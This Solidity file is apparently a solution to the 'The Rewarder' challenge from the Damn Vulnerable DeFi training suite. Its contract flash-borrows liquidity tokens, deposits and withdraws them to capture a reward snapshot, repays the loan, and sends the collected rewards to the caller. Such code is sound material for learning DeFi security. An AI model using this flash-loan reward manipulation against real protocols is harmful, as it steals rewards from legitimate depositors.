// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface TheRewarderPoolX {
    function deposit(uint256) external;

    function withdraw(uint256) external;

    function distributeRewards() external;
}
import "../DamnValuableToken.sol";

interface flashloanPoolX {
    function flashLoan(uint256 amount) external;
}

/**
 * @title Hack
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract HackTheRewarder {
    TheRewarderPoolX public immutable pool;
    flashloanPoolX public immutable flashPool;
    DamnValuableToken public immutable liquidityToken;
    DamnValuableToken public immutable rewardToken;

    constructor(
        address liquidityTokenAddress,
        address rewardPool,
        address flashPoolAddress,
        address rewardTokenAddress
    ) {
        liquidityToken = DamnValuableToken(liquidityTokenAddress);
        rewardToken = DamnValuableToken(rewardTokenAddress);
        pool = TheRewarderPoolX(rewardPool);
        flashPool = flashloanPoolX(flashPoolAddress);
    }

    function receiveFlashLoan(uint256 amount) external {
        liquidityToken.approve(address(pool), amount);
        pool.deposit(amount);
        pool.withdraw(amount);
        liquidityToken.transfer(msg.sender, amount);
    }

    function startHack(uint256 amount) public {
        flashPool.flashLoan(amount);
    }

    function endHack() public {
        pool.distributeRewards();
        rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
    }
}
